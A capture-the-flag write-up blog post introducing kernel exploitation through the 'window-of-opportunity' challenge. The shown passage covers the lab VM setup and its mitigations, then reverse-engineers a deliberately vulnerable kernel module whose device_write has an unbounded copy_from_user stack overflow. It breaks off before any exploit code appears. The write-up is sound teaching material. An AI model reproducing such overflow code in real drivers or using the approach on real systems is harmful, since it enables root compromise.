<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures</title>
<meta property="og:title" content="Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures"><meta name=twitter:title content="Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures"><meta itemprop=name content="Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures"><meta name=application-name content="Window of Opportunity -- Intro to Kernel Exploitation | a rant of my adventures"><meta property="og:site_name" content="a rant of my adventures"><meta name=description content="first description"><meta itemprop=description content="first description"><meta property="og:description" content="first description"><meta name=twitter:description content="first description"><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><meta itemprop=image content="https://blog.caprinux.com"><meta property="og:image" content="https://blog.caprinux.com"><meta name=twitter:image content="https://blog.caprinux.com"><meta name=twitter:image:src content="https://blog.caprinux.com"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2023-07-25T05:59:12Z"><meta property="article:published_time" content="2023-07-25T05:59:12Z"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"Window of Opportunity -- Intro to Kernel Exploitation","author":{"@type":"Person","name":""},"datePublished":"2023-07-25","description":"first description","wordCount":3719,"mainEntityOfPage":"True","dateModified":"2023-07-25","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"a rant of my adventures"}}</script><meta name=generator content="Hugo 0.120.4"><link rel=canonical href=https://blog.caprinux.com/posts/ctfs/ictf-window-of-opportunity/><link href=/style.min.c057b23b6f98e9740699215eab13d6a6d17ac0da34d0b7e254903a4516387132.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://blog.caprinux.com/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"><link rel=icon type=image/svg+xml href=/icons/favicon.svg></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://blog.caprinux.com/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/pages/about/>About</a></li><li class=menu-separator><span></span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>Window of Opportunity -- Intro to Kernel Exploitation</h1><div class=post-meta><time datetime=2023-07-25T05:59:12+00:00 itemprop=datePublished>25 Jul 2023</time></div></header><details class=toc open><summary><b>Table of Contents</b></summary><nav id=TableOfContents><ul><li><a href=#poking-around>Poking Around</a></li><li><a href=#understanding-our-environment>Understanding our Environment</a></li><li><a href=#reverse-engineering-challko>Reverse Engineering: chall.ko</a><ul><li><a href=#init_module>init_module</a></li><li><a href=#device_write-buffer-overflow>device_write (buffer overflow?!)</a></li><li><a href=#device_ioctl>device_ioctl</a></li></ul></li><li><a href=#fighting-kaslr>Fighting KASLR</a></li><li><a href=#getting-our-hands-dirty-defeating-kaslr>Getting our hands dirty: Defeating KASLR</a></li><li><a href=#fighting-stack-cookies>Fighting Stack Cookies</a></li><li><a href=#getting-our-hands-dirty-krop-to-root>Getting our hands dirty: KROP to root</a><ul><li><a href=#what-modprobe-what-path>what modprobe what path?</a></li><li><a href=#crafting-krop-chain>Crafting kROP chain</a></li></ul></li><li><a href=#extra-lore-----kaslr-bypass-via-cpu_entry_area>Extra lore &mdash; kASLR bypass via cpu_entry_area</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></details><div class=page-content><p>Imaginary CTF 2023 has just ended and it once again did not disappoint. The CTF featured a variety of fun and interesting challenges. Kudos to the organizers for yet another successful event.</p><p>One of the interesting challenges that I solved this year was window-of-opportunity, which is a kernelspace pwn challenge. In this writeup, I will share my thought processes and hopefully bring you some insights or new knowledge into the world of kernelspace!</p><h1 id=window-of-opportunity>Window Of Opportunity</h1><blockquote><p>Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.</p></blockquote><pre tabindex=0><code>.
├── bzImage
├── decompress.sh
├── gdb.sh
├── initramfs.cpio
├── run.sh
└── src
    ├── Makefile
    ├── exploit
    └── exploit.c

1 directory, 8 files
</code></pre><h2 id=poking-around>Poking Around</h2><p>We are provided with some files, notably</p><ul><li>bzImage <em>(kernel image)</em></li><li>initramfs.cpio <em>(compressed file system)</em></li><li>run.sh <em>(qemu command to boot the kernel)</em></li><li>exploit.c <em>(template exploit code)</em></li></ul><p>Conveniently, if we look at <code>src/Makefile</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=line><span class=cl><span class=nf>run</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        ../run.sh ../initramfs.cpio exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>debug</span><span class=o>:</span>
</span></span><span class=line><span class=cl>        tmux split-window -h <span class=s2>&#34;sudo gdb ../vmlinux -x ../gdb.sh&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>$(</span>MAKE<span class=k>)</span> run
</span></span></code></pre></div><p>The author provides us a convenient way to compile, run and debug our exploit!</p><p>We can simply use the <code>make</code> command to boot the kernel or <code>make debug</code> to boot the kernel and attach GDB.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>Boot time: 4.26
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---------------------------------------------------------------
</span></span><span class=line><span class=cl>                     _
</span></span><span class=line><span class=cl>                    <span class=p>|</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>       __      _____<span class=p>|</span> <span class=p>|</span> ___ ___  _ __ ___   ___
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>/<span class=se>\ </span>/ / _ <span class=se>\ </span><span class=p>|</span>/ __/ _ <span class=se>\|</span> <span class=s1>&#39;_ ` _ \ / _ \
</span></span></span><span class=line><span class=cl><span class=s1>        \ V  V /  __/ | (_| (_) | | | | | |  __/_
</span></span></span><span class=line><span class=cl><span class=s1>         \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>  Take the opportunity. Look through the window. Get the flag.
</span></span></span><span class=line><span class=cl><span class=s1>---------------------------------------------------------------
</span></span></span><span class=line><span class=cl><span class=s1>/ $ ls
</span></span></span><span class=line><span class=cl><span class=s1>bin       etc       home      proc      sbin      usr
</span></span></span><span class=line><span class=cl><span class=s1>chall.ko  exploit   init      root      sys       var
</span></span></span><span class=line><span class=cl><span class=s1>dev       flag.txt  linuxrc   run       tmp
</span></span></span><span class=line><span class=cl><span class=s1>/ $ cat flag.txt
</span></span></span><span class=line><span class=cl><span class=s1>cat: can&#39;</span>t open <span class=s1>&#39;flag.txt&#39;</span>: Permission denied
</span></span><span class=line><span class=cl>/ $
</span></span></code></pre></div><h2 id=understanding-our-environment>Understanding our Environment</h2><p>Using the <code>decompress.sh</code> script, we can unpack <code>initramfs.cpio</code> to give us our compressed file system used for the kernel.</p><p>The file that we are interested in looking is <code>etc/init.d/rcS</code>, which is a shell script that is run on startup.</p><p>It might seem a little overwhelming, but I have added some comments to the script to make it easier to understand.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span>/usr/sbin:/usr/bin:/sbin:/bin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># unimportant: create necessary root directories</span>
</span></span><span class=line><span class=cl><span class=o>[</span> -d /dev <span class=o>]</span> <span class=o>||</span> mkdir -m <span class=m>0755</span> /dev
</span></span><span class=line><span class=cl><span class=o>[</span> -d /sys <span class=o>]</span> <span class=o>||</span> mkdir /sys
</span></span><span class=line><span class=cl><span class=o>[</span> -d /proc <span class=o>]</span> <span class=o>||</span> mkdir /proc
</span></span><span class=line><span class=cl><span class=o>[</span> -d /tmp <span class=o>]</span> <span class=o>||</span> mkdir /tmp
</span></span><span class=line><span class=cl><span class=o>[</span> -d /run <span class=o>]</span> <span class=o>||</span> mkdir /run
</span></span><span class=line><span class=cl><span class=o>[</span> -d /root <span class=o>]</span> <span class=o>||</span> mkdir /root
</span></span><span class=line><span class=cl><span class=o>[</span> -d /etc <span class=o>]</span> <span class=o>||</span> mkdir /etc
</span></span><span class=line><span class=cl><span class=o>[</span> -d /home <span class=o>]</span> <span class=o>||</span> mkdir /home
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create root user</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;root:x:0:0:root:/root:/bin/sh&#39;</span> &gt; /etc/passwd
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;root:x:0:&#39;</span> &gt; /etc/group
</span></span><span class=line><span class=cl>chmod <span class=m>644</span> /etc/passwd
</span></span><span class=line><span class=cl>chmod <span class=m>644</span> /etc/group
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create unprivileged user</span>
</span></span><span class=line><span class=cl>adduser user --disabled-password
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># give appropriate permissions for files</span>
</span></span><span class=line><span class=cl>chown -R root:root /
</span></span><span class=line><span class=cl>chmod <span class=m>700</span> -R /root
</span></span><span class=line><span class=cl>chown user:user /home/user
</span></span><span class=line><span class=cl>chmod <span class=m>777</span> /home/user
</span></span><span class=line><span class=cl>chmod <span class=m>777</span> /tmp
</span></span><span class=line><span class=cl>chmod <span class=m>755</span> /dev
</span></span><span class=line><span class=cl><span class=c1># flag.txt cannot be read/written by anyone</span>
</span></span><span class=line><span class=cl>chmod <span class=m>0</span> /flag.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># unimportant</span>
</span></span><span class=line><span class=cl>mkdir -p /var/lock
</span></span><span class=line><span class=cl>mount -t sysfs -o nodev,noexec,nosuid sysfs /sys
</span></span><span class=line><span class=cl>mount -t proc -o nodev,noexec,nosuid proc /proc
</span></span><span class=line><span class=cl>ln -sf /proc/mounts /etc/mtab
</span></span><span class=line><span class=cl>mount -t devtmpfs -o nosuid,mode<span class=o>=</span><span class=m>0755</span> udev /dev
</span></span><span class=line><span class=cl>mkdir -p /dev/pts
</span></span><span class=line><span class=cl>mount -t devpts -o noexec,nosuid,gid<span class=o>=</span>5,mode<span class=o>=</span><span class=m>0620</span> devpts /dev/pts <span class=o>||</span> <span class=nb>true</span>
</span></span><span class=line><span class=cl>mount -t tmpfs -o <span class=s2>&#34;noexec,nosuid,size=10%,mode=0755&#34;</span> tmpfs /run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># important!! read more below</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>2</span> &gt; /proc/sys/kernel/kptr_restrict
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>2</span> &gt; /proc/sys/kernel/perf_event_paranoid
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>1</span> &gt; /proc/sys/kernel/dmesg_restrict
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># unimportant: mount stuff</span>
</span></span><span class=line><span class=cl>mkdir /tmp/mount
</span></span><span class=line><span class=cl>mount -t 9p -o <span class=nv>trans</span><span class=o>=</span>virtio,version<span class=o>=</span>9p2000.L host0 /tmp/mount
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># copy in our exploit executable</span>
</span></span><span class=line><span class=cl>cp /dev/sda /exploit
</span></span><span class=line><span class=cl>chmod +x /exploit
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># load the vulnerable kernel module</span>
</span></span><span class=line><span class=cl>insmod chall.ko
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># the kernel module registered a chrdev</span>
</span></span><span class=line><span class=cl><span class=c1># we provide proper permissions to chrdev</span>
</span></span><span class=line><span class=cl><span class=c1># so that the user can interact with it</span>
</span></span><span class=line><span class=cl>dmesg <span class=p>|</span> grep mknod <span class=p>|</span> awk -F <span class=s2>&#34;&#39;&#34;</span> <span class=s1>&#39;{print $2}&#39;</span> <span class=p>|</span> sh
</span></span><span class=line><span class=cl>chmod <span class=m>777</span> /dev/window
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> -e <span class=s2>&#34;\nBoot time: </span><span class=k>$(</span>cut -d<span class=s1>&#39; &#39;</span> -f1 /proc/uptime<span class=k>)</span><span class=s2>\n&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># login with non-privileged user</span>
</span></span><span class=line><span class=cl>setsid cttyhack setuidgid <span class=m>1000</span> sh --login
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># exit gracefully</span>
</span></span><span class=line><span class=cl>umount /proc
</span></span><span class=line><span class=cl>umount /sys
</span></span><span class=line><span class=cl>poweroff -d <span class=m>0</span> -f
</span></span></code></pre></div><p>The following lines are some security features that are set by the <code>rcS</code> script.</p><ul><li><strong>kptr_restrict</strong><ul><li>kernel pointers that are printed will (not) be censored</li><li><strong>impact:</strong> prevent leaking of kernel addresses</li></ul></li><li><strong>perf_event_paranoid</strong><ul><li>controls use of the performance events system by unprivileged users</li><li><strong>impact:</strong> prevent leaking of kernel addresses?</li></ul></li><li><strong>dmesg_restrict</strong><ul><li>control access to kernel buffer <em>(dmesg)</em></li><li><strong>impact:</strong> prevent leaking of kernel addresses</li></ul></li></ul><p>As you can tell, all three security features are in place to prevent unprivileged users from leaking any sort of information from the kernel.</p><p>This forces us to find a way to exploit the possibly vulnerable kernel driver instead of simply reading leaked pointers from the kernel or similar.</p><p>Apart from these security features that are enabled on runtime, there are other security features that are enabled when booting the kernel and can be found in <code>run.sh</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>    qemu-system-x86_64 -no-reboot <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -m 256M<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -kernel <span class=nv>$KERNEL_PATH</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -initrd <span class=nv>$1</span>  <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -cpu kvm64,+smep,+smap <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -append <span class=s2>&#34;console=ttyS0 oops=panic panic=1 kpti=1 kaslr quiet&#34;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -drive <span class=nv>file</span><span class=o>=</span><span class=nv>$2</span>,format<span class=o>=</span>raw <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -monitor /dev/null <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -serial mon:stdio <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -virtfs local,path<span class=o>=</span>/tmp,mount_tag<span class=o>=</span>host0,security_model<span class=o>=</span>passthrough,id<span class=o>=</span>foobar <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        -nographic -s
</span></span></code></pre></div><p>Based on the qemu command, the following protections are enabled:</p><ul><li>Supervisor Mode Excess Prevention (SMEP)<ul><li>prevents executing in userspace addresses</li></ul></li><li>Supervisor Mode Access Prevention (SMAP)<ul><li>prevents read/writing to userspace addresses</li></ul></li><li>Kernel Address Space Layout Randomization (KASLR)<ul><li>randomizes addresses where kernel is loaded in memory</li><li>ASLR is a little predictable?</li></ul></li><li>Kernel Page Table Isolation (KPTI)<ul><li>mainly to mitigate meltdown vulnerability</li><li>isolate userspace memory with kernel memory</li><li>little effect on most kernel exploitation techniques</li></ul></li></ul><p>For ease of debugging our exploits, we can disable some of the restrictions and change our startup shell to be a root shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl><span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/kernel/kptr_restrict
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/kernel/perf_event_paranoid
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=m>0</span> &gt; /proc/sys/kernel/dmesg_restrict
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>setsid cttyhack setuidgid <span class=m>0</span> sh --login <span class=c1># login as uid 0 instead of 1000</span>
</span></span></code></pre></div><h2 id=reverse-engineering-challko>Reverse Engineering: chall.ko</h2><h3 id=init_module>init_module</h3><p>Given that most modern kernel mitigation techniques are enabled, we will need to look for some powerful primitives that can help us work around these protections and still get to root.</p><p>We start from <code>init_module</code>, which is a function that is run only once &mdash; when loading the module.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=n>Major_num</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>file_operations</span> <span class=n>fops</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>unlocked_ioctl</span>     <span class=o>=</span> <span class=n>device_ioctl</span><span class=p>;</span>    <span class=c1>// interact via ioctl(fd, cmd, arg)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>.</span><span class=n>compat_ioct</span>        <span class=o>=</span> <span class=n>device_ioctl</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>write</span>              <span class=o>=</span> <span class=n>device_write</span><span class=p>;</span>    <span class=c1>// interact via write(fd, buf, cou)
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>.</span><span class=n>release</span>            <span class=o>=</span> <span class=n>device_release</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>.</span><span class=n>open</span>               <span class=o>=</span> <span class=n>device_open</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>init_module</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>Major_num</span> <span class=o>=</span> <span class=nf>_register_chrdev</span><span class=p>(</span><span class=mi>0LL</span><span class=p>,</span> <span class=mi>0LL</span><span class=p>,</span> <span class=mi>256LL</span><span class=p>,</span> <span class=s>&#34;window&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>fops</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>Major_num</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;Registered character device with major number %d&#34;</span><span class=p>,</span> <span class=n>Major_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;&#39;mknod /dev/%s c %d 0&#39;.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=s>&#34;window&#34;</span><span class=p>,</span> <span class=n>Major_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;Knock, and the door will be opened unto you.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printk</span><span class=p>(</span><span class=s>&#34;Failed to register device, major num returned %d&#34;</span><span class=p>,</span> <span class=n>Major_num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=n>Major_num</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This function simply registers a <em><a href="https://www.oreilly.com/library/view/linux-device-drivers/9781785280009/2c9a91ee-2e24-4d70-808d-58b5ad67ea55.xhtml#:~:text=Character%20devices%20transfer%20data%20to,like%20a%20serial%20port%20does.">character device</a></em>, and maps some interaction with the device to the corresponding function via the <code>file_operations</code> struct.</p><blockquote><p>Think of a character device like a MacDonalds drive-thru.</p><p>Just like how the MacDonalds drive-thru is a way for you to interact with MacDonald employees to get your order, the character device is a way for you to interact with the kernel module to do whatever you want it to do.</p></blockquote><h3 id=device_write-buffer-overflow>device_write (buffer overflow?!)</h3><p>One way we can interact with the device is by writing to <code>/dev/window</code> which would trigger the <code>device_write</code> function.</p><p>If we try to decompile the code in IDA, we get some very weird code here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>device_write</span><span class=p>(</span><span class=n>file</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>count</span><span class=p>,</span> <span class=kt>loff_t</span> <span class=o>*</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// rbp
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>a</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-50h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v7</span><span class=p>;</span> <span class=c1>// [rsp+40h] [rbp-10h]
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kr>__int64</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// [rsp+48h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>_fentry__</span><span class=p>(</span><span class=n>file</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>v8</span> <span class=o>=</span> <span class=n>v4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>v7</span> <span class=o>=</span> <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>copy_from_user</span><span class=p>(</span><span class=n>a</span><span class=p>);</span> <span class=c1>// &lt;-- copy_from_user should take 3 arguments!!
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Hence we will need to change the call type for some functions and fix up the code a little.</p><p>After cleaning up the code, we get something nicer like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>ssize_t</span> <span class=nf>device_write</span><span class=p>(</span><span class=n>file</span> <span class=o>*</span><span class=n>file</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buf</span><span class=p>,</span> <span class=kt>size_t</span> <span class=n>count</span><span class=p>,</span> <span class=kt>loff_t</span> <span class=o>*</span><span class=n>offset</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>a</span><span class=p>[</span><span class=mi>64</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>canary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>canary</span> <span class=o>=</span> <span class=nf>__readgsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>  <span class=c1>// copy count bytes from buffer `buf` in userspace to buffer `a` in kernelspace
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>copy_from_user</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=n>count</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0LL</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This function is straightforward. If you haven&rsquo;t noticed, there is no bounds check for the amount of bytes that is copied from userspace to the kernel.</p><p>This gives us our first vulnerability, a buffer overflow!</p><p>However, as you can also see, there is <strong>stack canary protections</strong>. This prevents us from trivially wrecking the stack and corrupting our instruction pointer. We will have to find a way to <strong>leak a stack canary</strong> in order for our buffer overflow to be useful.</p><h3 id=device_ioctl>device_ioctl</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span><span class=o>*</span> <span class=n>ptr</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>request</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
